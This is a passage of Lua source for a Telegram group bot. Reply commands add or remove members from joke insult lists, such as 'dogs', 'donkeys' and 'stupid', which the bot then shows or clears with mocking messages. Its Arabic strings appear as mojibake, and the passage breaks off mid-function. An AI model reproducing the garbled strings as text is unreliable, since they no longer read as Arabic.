if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨͺΨ?Ψ²ΩΩΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΩΨͺΨ?Ψ²ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'mkhzz:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ ΩΨͺΨ?Ψ²ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­β― 
 ΩΨ°Ψ§ Ψ§ΩΨΉΨΆΩ ΩΨͺΨ?Ψ²ΩΩ ΩΨͺΩΨ± Ψ¨Ψ±Ψ§Ψ­Ω ΨΉΩΩΩ π―
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΨͺΨ?Ψ²ΩΩ")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'mkhzz:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ ΩΨͺΨ?Ψ²ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­β― 
 ΨͺΨΉΩΨ΄ ΩΨͺΨͺΨ?Ψ²ΩΩ ΨͺΨ§ΩΩ πΉπ
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΨ­ΩΨ§ΩΩΩ' then
database:del(bot_id..'hkkaa:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ­ΩΨ§ΩΩΩ')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΨ­ΩΨ§ΩΩΩ") or text == ("ΨͺΨ§Ω ΩΩΨ­ΩΨ§ΩΩΩ") then
local list = database:smembers(bot_id..'hkkaa:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© Ψ­ΩΨ§ΩΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΨ­ΩΨ§Ω [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΨ­ΩΨ§Ω `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­ΩΨ§ΩΩΩ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ Ψ­ΩΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'hkkaa:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ Ψ­ΩΨ§Ω Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ­ΩΩΨ§ Ω Ψ­ΨͺΩ ΨͺΨ§ΩΩΩ ΩΨΉΨ±ΩπΉπ
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ Ψ­ΩΨ§Ω")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'hkkaa:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ Ψ­ΩΨ§Ω Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ§Ψ¨ΩΨ§ Ψ­ΩΩΨ§ ΨͺΨ§ΩΩ Ψ¨ΩΨ§Ψ§ π
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΨΉΨ±Ψ±' then
database:del(bot_id..'erraa:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨΉΨ±Ψ±')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΨΉΨ±Ψ±") or text == ("ΨͺΨ§Ω ΩΩΨΉΨ±Ψ±") then
local list = database:smembers(bot_id..'erraa:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΨΉΨ±Ψ± Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΨΉΨ±Ω [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΨΉΨ±Ψ± `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΨΉΨ±Ψ±"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΨΉΨ±Ω") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'erraa:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ ΨΉΨ±Ω Ψ¨ΩΨ¬Ψ§Ψ­β― 
 ΩΩΨ§ Ω ΨΉΨ±Ω Ψ§ΩΨΉΨ±Ψ± ΩΩ ΩΩΨ§ π
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΨΉΨ±Ω")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'erraa:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ ΨΉΨ±Ω Ψ¨ΩΨ¬Ψ§Ψ­β― 
 ΩΨ§Ω Ψ§ΩΨ¨Ψ± ΨΉΨ±Ω Ω Ψ§ΩΨ±ΩΩ Ψ?Ψ³Ψ§Ψ±Ω ΩΨ²ΩΨͺΩΩ ΩΩΩ π
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΨ?ΩΨ§Ψ²ΩΨ±' then
database:del(bot_id..'khnnzr:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ?ΩΨ§Ψ²ΩΨ±')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΨ?ΩΨ§Ψ²ΩΨ±") or text == ("ΨͺΨ§Ω ΩΩΨ?ΩΨ§Ψ²ΩΨ±") then
local list = database:smembers(bot_id..'khnnzr:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© Ψ?ΩΨ§Ψ²ΩΨ± Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΨ?ΩΨ²ΩΨ± [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΨ?ΩΨ²ΩΨ± `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ?ΩΨ§Ψ²ΩΨ±"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ Ψ?ΩΨ²ΩΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'khnnzr:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ Ψ?ΩΨ²ΩΨ± Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ¨ΩΨ§ Ψ?ΩΨ²ΩΨ± Ψ±Ψ³ΩΩ ΩΩΨ¨ΩΨ± ΩΨ―Ψ§ π
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ Ψ?ΩΨ²ΩΨ±")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'khnnzr:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ Ψ?ΩΨ²ΩΨ± Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ§ΩΨ­ΩΨ―ΩΩΩ ΨΉΩΩ Ψ―ΩΩΩΨͺΩ ΩΨ¨ΩΨ§Ψ΄ Ψ?ΩΨ²ΩΨ± π
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΨ§ΨΊΨ¨ΩΨ§Ψ‘' then
database:del(bot_id..'ghabi:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΨΊΨ¨ΩΨ§Ψ‘')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΨ§ΨΊΨ¨ΩΨ§Ψ‘") or text == ("ΨͺΨ§Ω ΩΩΨ§ΨΊΨ¨ΩΨ§Ψ‘") then
local list = database:smembers(bot_id..'ghabi:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© Ψ§ΨΊΨ¨ΩΨ§Ψ‘ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΨΊΨ¨Ω [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΨΊΨ¨Ω `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ§ΨΊΨ¨ΩΨ§Ψ‘"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΨΊΨ¨Ω") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'ghabi:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ Ψ§ΩΨΊΨ¨Ω Ψ¨ΩΨ¬Ψ§Ψ­β―
 ΨͺΩΨͺ Ψ₯ΨΆΨ§ΩΨͺΩ Ψ₯ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ£ΨΊΨ¨ΩΨ§Ψ‘
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΨΊΨ¨Ω")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'ghabi:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΊΨ¨Ω Ψ¨ΩΨ¬Ψ§Ψ­β―
 Ψ§ΩΨ­ΩΨ―ΩΩΩ ΨΉΩΩ Ψ―ΩΩΩΨͺΩ Ψ¨ΩΩ Ψ§Ψ°ΩΩ Ψ§Ψ?ΩΨ§ΨͺΩ
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΩΨ±Ψ³Ψ§Ψͺ' then
database:del(bot_id..'frrsw:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΨ±Ψ³Ψ§Ψͺ')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΩΨ±Ψ³Ψ§Ψͺ") or text == ("ΨͺΨ§Ω ΩΩΩΨ±Ψ³Ψ§Ψͺ") then
local list = database:smembers(bot_id..'frrsw:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΨ±Ψ³Ψ§Ψͺ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΨ±Ψ³Ω [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΨ±Ψ³Ω `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ±Ψ³Ψ§Ψͺ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΩΨ±Ψ³Ω") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'frrsw:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ ΩΨ±Ψ³Ω Ψ¨ΩΨ¬Ψ§Ψ­β― 
 ΨͺΨΉ Ψ§Ψ¬ΩΨ¨ΩΩ Ψ³Ψ±Ψ¬ Ψ­Ψ¨Ω πΉπ
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΨ±Ψ³Ω")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'frrsw:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ ΩΨ±Ψ³Ω Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ±Ψ¬ΨΉ Ψ§ΩΨ³Ψ±Ψ¬ Ψ­Ψ¨ΩπΉπ
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΩΨ²Ψ²' then
database:del(bot_id..'mozza:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΨ²Ψ²')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΩΨ²Ψ²") or text == ("ΨͺΨ§Ω ΩΩΩΨ²Ψ²") then
local list = database:smembers(bot_id..'mozza:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΨ²Ψ² Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΨ²Ω [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΨ²Ω `"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ²Ψ²"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΩΨ²Ω") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'mozza:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ ΩΨ²Ω Ψ¨ΩΨ¬Ψ§Ψ­β― 
 Ψ§Ψ΅Ψ¨Ψ­Ψͺ Ψ§ΩΨ§Ω ΩΨ²ΨͺΩ πΉπ
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΨ²Ω")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..'mozza:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨΉΨΆΩ ΩΨ²Ω Ψ¨ΩΨ¬Ψ§Ψ­β― 
 ΩΩ Ψ΅Ψ―ΩΨͺ ΩΩΨ³ΩΨ§ ΩΩΨ§ Ψ§Ω π
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΩΩΨ§Ψ¨' then
database:del(bot_id..' dog:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΩΨ§Ψ¨')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΩΩΨ§Ψ¨") or text == ("ΨͺΨ§Ω ΩΩΩΩΨ§Ψ¨") then
local list = database:smembers(bot_id..' dog:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΩΨ§Ψ¨ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΩΩΨ¨ [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΩΩΨ¨`"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ§Ψ¨"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ ΩΩΨ¨") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..' dog:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ Ψ§ΩΩΩΨ¨ Ψ¨ΩΨ¬Ψ§Ψ­β―
 ΨͺΩΨͺ Ψ₯ΨΆΨ§ΩΨͺΩ Ψ₯ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨ§Ψ¨
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ ΩΩΨ¨")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..' dog:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΩΩΨ¨ Ψ¨ΩΨ¬Ψ§Ψ­β―
 ΨͺΩΨͺ Ψ§Ψ²Ψ§ΩΨͺΩ ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨ§Ψ¨
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

------

if text == 'ΩΨ³Ψ­ Ψ§ΩΨ­ΩΩΨ±' then
database:del(bot_id..' 7omar:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ­ΩΩΨ±')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΨ­ΩΩΨ±") or text == ("ΨͺΨ§Ω ΩΩΨ­ΩΩΨ±") then
local list = database:smembers(bot_id..' 7omar:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© Ψ­ΩΩΨ± Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΨ­ΩΨ§Ψ± [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΨ­ΩΨ§Ψ±`"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­ΩΩΨ±"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ Ψ­ΩΨ§Ψ±") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..' 7omar:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
 ΨͺΩ Ψ±ΩΨΉ Ψ§ΩΨ­ΩΨ§Ψ± Ψ¨ΩΨ¬Ψ§Ψ­β―
 ΨͺΩΨͺ Ψ₯ΨΆΨ§ΩΨͺΩ Ψ₯ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ­ΩΩΨ±
Ω­ 
]] 
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("ΨͺΩΨ²ΩΩ Ψ­ΩΨ§Ψ±")) and msg.reply_to_message_id_ then
function start_function(extra, result, success)
database:srem(bot_id..' 7omar:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
Text = [[
 ΨͺΩ ΨͺΩΨ²ΩΩ Ψ§ΩΨ­ΩΨ§Ψ± Ψ¨ΩΨ¬Ψ§Ψ­β―
 ΨͺΩΨͺ Ψ§Ψ²Ψ§ΩΨͺΩ ΩΩ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ­ΩΩΨ± Ψ¨ΩΩ Ψ¨ΨΊΩ 
Ω­ 
]]
send(msg.chat_id_, msg.id_, usertext..Text)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

-------

if text == 'ΩΨ³Ψ­ Ψ§ΩΨ²ΩΨ¬Ψ§Ψͺ' then
database:del(bot_id..'zoga:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ²ΩΨ¬Ψ§Ψͺ')
end

if text == ("ΨͺΨ§Ψ¬ ΩΩΨ²ΩΨ¬Ψ§Ψͺ") or text == ("ΨͺΨ§Ω ΩΩΨ²ΩΨ¬Ψ§Ψͺ") then
local list = database:smembers(bot_id..'zoga:User'..msg.chat_id_)
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© Ψ²ΩΨ¬Ψ§Ψͺ Ψ§ΩΨ¬Ψ±ΩΨ¨ \nΒ©βββββΒ©βββββΒ©\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."Β» Ψ§ΩΨ²ΩΨ¬Ω [@"..username.."]\n"
else
t = t..""..k.."Β» Ψ§ΩΨ²ΩΨ¬Ω`"..v.."`\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ²ΩΨ¬Ψ§Ψͺ"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("Ψ±ΩΨΉ Ψ²ΩΨ¬ΨͺΩ") or text == ("Ψ²ΩΨ§Ψ¬") and tonumber(msg.reply_to_message_id_) ~= 0 then


function start_function(extra, result, success)
database:sadd(bot_id..'zoga:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'revorb0t')..')'
local Text = [[
